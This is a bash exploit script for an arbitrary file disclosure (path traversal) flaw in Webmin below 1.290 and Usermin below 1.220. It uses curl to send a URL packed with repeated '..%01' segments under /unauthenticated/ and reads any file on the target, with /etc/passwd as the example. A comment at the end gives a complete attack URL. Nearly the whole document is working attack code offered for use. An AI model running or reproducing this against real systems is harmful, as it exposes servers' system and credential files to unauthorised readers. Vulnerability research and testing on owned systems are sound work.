#!/bin/bash

# Vulnerability: Arbitrary File Disclosure
# Application: Webmin < 1.290 / Usermin < 1.220
# Author: Ivan Glinkin
# Contact: mail@ivanglinkin.com
# Release date: December 04, 2020


# Variables
## General
host="127.0.0.1"; 				# Web-address - Change according to your needs
port="10000";					# Port, by default 10000
path="/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01";
file=$1; 					# Payload - File to read
file_example="/etc/passwd";			# Example domain
grep=$2;					# grep string
grep_example="bash";				# Example domain

# Output

## Header
echo -e "\n\e[00;33m╔═══════════════════════════════════════════════════════════════════════════╗\e[00m"
echo -e "\e[00;33m║\t\t\t\t\t\t\t\t\t    ║\e[00m"
echo -e "\e[00;33m║\e[00m\e[01;32m\t Arbitrary File Disclosure - Webmin < 1.290 / Usermin < 1.220  \t    \e[00m\e[00;33m║\e[00m"
echo -e "\e[00;33m║\t\t\t\t\t\t\t\t\t    ║\e[00m"
echo -e "\e[00;33m╚═══════════════════════════════════════════════════════════════════════════╝\e[00m"
echo -e ""
echo -e "\e[00;33m[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @IvanGlinkin\e[00m"
echo -e "";

if [ -z "$file" ]
then
	echo -e "\e[00;33m[ ! ] Usage pattern:\e[00m" "\e[01;31m$0 file_name_to_read \e[00m\e[01;32m[grep string]\e[00m"	
	echo -e "\e[00;33m[ ! ] Usage example:\e[00m" "\e[01;31m$0 $file_example\e[00m"
	echo -e "\e[00;33m[ ! ] Usage example:\e[00m" "\e[01;31m$0 $file_example \e[00m\e[01;32m$grep_example\e[00m\n"
	exit
else
	echo -e "\e[00;33m[ ! ] Get information about \e[00m\e[01;31m$file\e[00m\e[00;33m file from \e[01;31m$host\e[00m\e[00;33m host\e[00m\n"
fi

#exploit
if [ -z "$grep" ]
then
	curl -s "$host:$port$path$file"
else
	curl -s "$host:$port$path$file" | grep -i "$grep"
fi
#http://192.168.1.1:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
